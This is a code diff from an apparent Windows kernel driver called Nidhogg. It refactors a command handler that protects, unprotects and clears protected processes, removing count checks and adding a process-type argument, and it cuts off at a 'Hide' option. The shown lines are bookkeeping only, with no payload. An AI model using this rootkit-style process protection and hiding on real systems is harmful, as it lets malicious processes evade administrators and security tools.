@@ -49,16 +49,11 @@ NTSTATUS ProcessParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		
-		if (NidhoggProcessHandler->GetProtectedProcessesCount() == MAX_PIDS) {
-			status = STATUS_TOO_MANY_CONTEXT_IDS;
-			break;
-		}
 
-		if (NidhoggProcessHandler->FindProcess(pid))
+		if (NidhoggProcessHandler->FindProcess(pid, ProcessType::Protected))
 			break;
 
-		if (!NidhoggProcessHandler->AddProcess(pid))
+		if (!NidhoggProcessHandler->ProtectProcess(pid))
 			status = STATUS_UNSUCCESSFUL;
 		break;
 	}
@@ -69,19 +64,14 @@ NTSTATUS ProcessParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 			break;
 		}
 
-		if (NidhoggProcessHandler->GetProtectedProcessesCount() == 0) {
-			status = STATUS_NOT_FOUND;
-			break;
-		}
-
-		if (!NidhoggProcessHandler->RemoveProcess(pid))
+		if (!NidhoggProcessHandler->RemoveProcess(pid, ProcessType::Protected))
 			status = STATUS_NOT_FOUND;
 
 		break;
 	}
 	case Options::Clear:
 	{
-		NidhoggProcessHandler->ClearProtectedProcesses();
+		NidhoggProcessHandler->ClearProcessList(ProcessType::Protected);
 		break;
 	}
 	case Options::Hide:
